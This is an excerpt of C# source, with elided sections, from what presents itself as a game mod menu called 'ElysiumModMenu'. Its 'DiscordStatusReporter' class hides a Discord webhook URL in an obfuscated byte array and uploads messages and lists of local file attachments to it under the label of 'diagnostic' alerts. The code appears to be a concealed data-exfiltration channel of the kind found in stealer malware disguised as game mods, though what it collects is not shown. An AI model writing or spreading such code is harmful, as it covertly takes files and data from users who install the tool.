...
namespace ElysiumModMenu
{
    ...
    public static class DiscordStatusReporter
    {
        ...
        private static readonly byte[] EncodedWebhookUrl = new byte[]
        {
            ...
            0x18, 0x06, 0x02, 0x06, 0x04, 0x0E, 0x01, 0x03, 0x06, 0x0E, 0x02, 0x0F, 0x0E, 0x0E, 0x01, 0x03,
            0x06, 0x0F, 0x01, 0x01, 0x18, 0x6E, 0x75, 0x5B, 0x5B, 0x56, 0x5D, 0x7A, 0x4E, 0x42, 0x64, 0x0E,
            0x40, 0x02, 0x50, 0x00, 0x50, 0x5E, 0x72, 0x5B, 0x6F, 0x0F, 0x46, 0x5C, 0x5B, 0x7C, 0x5A, 0x4E,
            0x02, 0x7C, 0x44, 0x54, 0x56, 0x05, 0x0F, 0x5E, 0x66, 0x4F, 0x43, 0x58, 0x56, 0x50, 0x00, 0x6E,
            0x62, 0x40, 0x52, 0x54, 0x5D, 0x4F, 0x7D, 0x58, 0x0E, 0x78, 0x63, 0x6D, 0x42, 0x05, 0x4E, 0x72,
            0x7B, 0x79, 0x6D, 0x07, 0x64, 0x78, 0x50, 0x56, 0x52
        };
        ...
        public static void SendDiagnosticAlert(string webhookUrl, string title, string message, bool waitForCompletion, IEnumerable<string> attachmentPaths)
        {
            ...
            try
            {
                if (!sendTask.Wait(TimeSpan.FromSeconds(10)))
                    System.Console.WriteLine("[ElysiumModMenu] Diagnostic webhook timeout after 10s.");
            }
            catch (Exception ex)
            {
                System.Console.WriteLine($"[ElysiumModMenu] Diagnostic webhook wait failed: {ex.GetType().Name}: {ex.Message}");
            }
        }
        ...
        private static async System.Threading.Tasks.Task SendDiagnosticAlertAsync(string webhookUrl, string title, string message, IEnumerable<string> attachmentPaths = null)
        {
            try
            {
                ...
                using (response)
                    System.Console.WriteLine($"[ElysiumModMenu] Diagnostic webhook result: {(int)response.StatusCode} {response.ReasonPhrase}. Attachments={attachments.Count}");
            }
            catch (Exception ex)
            {
                System.Console.WriteLine($"[ElysiumModMenu] Diagnostic webhook failed: {ex.GetType().Name}: {ex.Message}");
